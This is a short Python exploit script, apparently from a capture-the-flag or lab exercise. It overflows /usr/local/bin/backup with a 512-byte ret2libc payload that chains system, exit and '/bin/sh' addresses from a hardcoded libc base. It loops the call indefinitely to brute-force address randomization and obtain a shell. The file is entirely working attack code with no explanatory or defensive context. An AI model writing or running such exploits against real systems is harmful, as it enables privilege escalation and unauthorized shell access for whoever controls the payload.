from subprocess import call
import struct

libc_base_address = 0xf7585000
system_offset = 0x0003a940
system_address = libc_base_address + system_offset
exit_offset = 0x0002e7b0
exit_address = libc_base_address + exit_offset
binsh_address = libc_base_address + 0x00015900b

payload = "A" * 512
payload += struct.pack("<I", system_address)
payload += struct.pack("<I", exit_address)
payload += struct.pack("<I", binsh_address)

attempts = 0

while True:
        attempts += 1
        print "[*] Attempts: %s" %attempts
        ret = call(["/usr/local/bin/backup", "-i", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110", payload])
